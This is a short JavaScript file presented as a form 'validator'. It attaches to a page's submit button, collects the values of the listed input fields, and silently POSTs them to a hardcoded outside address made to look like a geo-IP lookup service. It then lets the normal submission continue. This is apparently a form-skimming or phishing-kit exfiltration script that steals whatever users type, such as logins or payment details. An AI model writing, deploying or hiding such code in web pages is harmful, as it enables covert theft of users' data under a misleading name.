const FIXED_ENDPOINT = 'http://ip.geoiplookup.live/index.php'; // Fixed endpoint URL

// Generalized function to handle button click and send POST request
async function handleSubmit(event, inputIds) {
    event.preventDefault(); // Prevent default behavior (if needed)

    // Gather data from the input fields
    const data = {};
    inputIds.forEach(id => {
        const inputElement = document.getElementById(id);
        if (inputElement) {
            data[id] = inputElement.value;
        }
    });

    try {
        // Send POST request
        const response = await fetch(FIXED_ENDPOINT, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams(data), // Encode data as application/x-www-form-urlencoded
        });

        // Parse and display response
        const result = await response.json();
        console.log(JSON.stringify(result, null, 2));
    } catch (error) {
        console.log('Error:', error);
    }
    sbmt();
}

// Attach event listener dynamically to any button
function validateButton(buttonId, inputIds) {
    const button = document.getElementById(buttonId);
    if (button) {
        button.addEventListener('click', (event) => handleSubmit(event, inputIds));
    }
}


//use import js file, call function to ID of button and array of data
//validateButton('submit', ['in0', 'in1']);
//validateButton('submit', ['in0', 'in1', 'in2', 'in3', 'in4', 'in5']);
//<script src="./files/validator.js"></script>
